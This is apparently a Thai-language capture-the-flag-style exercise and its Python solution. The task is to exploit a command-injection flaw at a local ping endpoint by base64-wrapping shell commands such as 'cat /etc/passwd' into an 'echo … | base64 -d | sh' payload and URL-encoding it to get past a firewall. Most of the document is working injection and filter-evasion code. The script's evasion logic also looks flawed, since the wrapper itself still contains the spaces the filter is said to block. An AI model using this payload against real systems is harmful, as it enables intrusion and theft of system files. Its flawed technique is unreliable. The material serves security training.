# ภารกิจที่ 3: "พรางตัวหลบยามหน้าประตู" (หมวด Encoding & Obfuscation)
# สถานการณ์:
# เป้าหมายมีช่องโหว่ Command Injection ที่หน้า http://127.0.0.1:5000/ping?ip= แต่เป้าหมายติดตั้ง WAF (Firewall) ที่จะบล็อกคำสั่งที่มีช่องว่าง (Space) และคำว่า cat ทันที คุณจึงต้องแปลง Payload ของคุณให้อยู่ในรูป Base64 ก่อนส่ง และต้องทำ URL Encoding ซ้อนอีกชั้นเผื่อตัวอักษรพิเศษหาย

# โจทย์ที่คุณต้องเขียนโค้ด:
# จงเขียนสคริปต์ที่รับคำสั่งจากผู้ใช้ (เช่น cat /etc/passwd) จากนั้นให้สคริปต์แปลงคำสั่งนั้นเป็น Base64 แล้วสร้าง Payload ในรูปแบบ:
# echo [Base64_String] | base64 -d | sh
# จากนั้นให้นำ Payload ก้อนนี้ไปทำ URL Encoding แล้วต่อท้าย URL เป้าหมายเพื่อสั่งรันและพิมพ์ผลลัพธ์หน้าจอ

# 💡 คำใบ้ (Hint):
# ใช้ base64.b64encode() กับคำสั่งของคุณ (อย่าลืม .encode('utf-8') ก่อน)
# ประกอบร่าง string แล้วค่อยใช้ urllib.parse.quote() ครอบอีกที

import base64
import urllib.parse
import requests

command = input().strip()
command=base64.b64encode(command.encode('utf-8')).decode('utf-8')

payload = f"echo {command} | base64 -d | sh"
payload_encode=urllib.parse.quote(payload)

url = f"http://127.0.0.1:5000/ping?ip={payload_encode}"
try:
    response = requests.get(url)
    print(f"[!!!] responsed data : {response.text}")
except requests.exceptions.ConnectionError :
    print(f"[*] fail to run this ip")






